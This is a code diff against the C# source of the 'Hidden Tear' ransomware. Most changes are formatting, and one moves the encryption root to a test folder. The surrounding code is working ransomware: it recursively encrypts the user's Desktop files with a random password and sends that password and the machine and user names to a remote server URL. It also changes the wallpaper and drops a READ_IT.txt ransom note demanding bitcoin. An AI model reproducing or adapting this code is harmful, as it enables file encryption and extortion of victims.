@@ -53,7 +53,7 @@ namespace hidden_tear
         string targetURL = "http://www.example.com/Server/write.php";
         string userName = Environment.UserName;
         string computerName = System.Environment.MachineName.ToString();
-        string userDir = "C:\\";
+        string userDir = "C:\\test";
         string backgroundImageUrl = "http://i.imgur.com/xZuLWTN.jpg"; //desktop background picture
 
 
@@ -125,14 +125,16 @@ namespace hidden_tear
             const string valid = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=?()"; //patern allowed
             StringBuilder res = new StringBuilder();
             Random rnd = new Random();
-            while (0 < length--) {
+            while (0 < length--)
+            {
                 res.Append(valid[rnd.Next(valid.Length)]);
             }
             return res.ToString();
         }
 
         //Sends created password target location
-        public void SendPassword(string password) {
+        public void SendPassword(string password)
+        {
 
             try
             {
@@ -142,7 +144,7 @@ namespace hidden_tear
             }
             catch (Exception)
             {
-                
+
             }
         }
 
@@ -195,7 +197,8 @@ namespace hidden_tear
                 {
                     encryptDirectory(childDirectories[i], password);
                 }
-            } catch (Exception)
+            }
+            catch (Exception)
             {
 
             }
@@ -260,12 +263,13 @@ namespace hidden_tear
                     SetWallpaperFromWeb(backgroundImageUrl, backgroundImageName);
                     SendPassword(password);
                 }
-            } while (Internet == false) ;
+            } while (Internet == false);
             password = null;
             System.Windows.Forms.Application.Exit();
         }
 
-        public void Directory_Settings_Sending(string password){
+        public void Directory_Settings_Sending(string password)
+        {
             //path to ecnrypt (child drectories already included)
             string path_1 = "Users\\";
             string startPath_1 = userDir + path_1 + userName + "\\Desktop";
@@ -301,7 +305,7 @@ namespace hidden_tear
             string path = "\\Desktop\\READ_IT.txt";
             string fullpath = userDir + "Users\\" + userName + path;
             string infos = computerName + "-" + userName;
-            string[] lines = { "This computer has been hacked","Your personal files have been ecrypted. Send me BTC or food to get decryption passcode.", "After that, you'll be able to see your beloved files again.","With love... Hidden Tear Project :')"};
+            string[] lines = { "This computer has been hacked", "Your personal files have been ecrypted. Send me BTC or food to get decryption passcode.", "After that, you'll be able to see your beloved files again.", "With love... Hidden Tear Project :')" };
             System.IO.File.WriteAllLines(fullpath, lines);
         }
 
@@ -320,7 +324,7 @@ namespace hidden_tear
                 webClient.DownloadFile(new Uri(url), path);
                 SetWallpaper(path);
             }
-            catch (Exception){ }
+            catch (Exception) { }
         }
     }
 }
